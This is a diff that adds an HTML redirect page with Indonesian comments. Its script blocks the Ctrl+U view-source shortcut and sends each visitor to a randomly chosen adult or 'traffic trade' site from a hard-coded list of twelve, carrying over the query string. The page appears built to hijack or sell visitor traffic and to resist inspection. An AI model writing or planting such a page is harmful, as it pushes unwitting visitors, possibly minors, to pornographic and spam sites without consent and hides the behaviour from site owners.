@@ -1,0 +1,49 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Redirection...</title>
+    <script>
+        // Fungsi untuk mencegah penggunaan Ctrl + U
+        document.addEventListener('keydown', function (e) {
+            if (e.ctrlKey && (e.key === 'u' || e.key === 'U')) {
+                e.preventDefault();
+                alert("View Source is disabled!");
+            }
+        });
+
+        // Daftar URL tujuan
+        const urls = [
+            "https://bigass.mom/trade",
+            "https://sendtech.me/trademaster",
+            "https://thepornfree.me/our-patners",
+            "https://axioporn.online/our-patners",
+            "https://thepornfree.me/our-patners",
+            "https://fursextube.site/our-patners",
+            "https://krotoporn.online/our-patners",
+            "https://skporn.me/our-patners",
+            "https://thepornos.mom/out/trade",
+            "https://porn-step.mom/our-patners",
+            "https://nakedwoman.online/our-network",
+            "https://pornder.site/our-network"
+        ];
+
+        // Logika untuk menentukan URL tujuan
+        const currentUrl = new URL(window.location.href);
+        const params = currentUrl.search; // Mendapatkan query string dari URL saat ini
+
+        // Pilih URL berdasarkan logika sederhana (misalnya menggunakan indeks acak)
+        const randomIndex = Math.floor(Math.random() * urls.length);
+        const destinationUrl = urls[randomIndex] + params;
+
+        // Redirect pengguna ke URL tujuan
+        window.location.href = destinationUrl;
+    </script>
+</head>
+<body>
+    <noscript>
+        <p>JavaScript is required for this page. Please enable it to continue.</p>
+    </noscript>
+</body>
+</html>
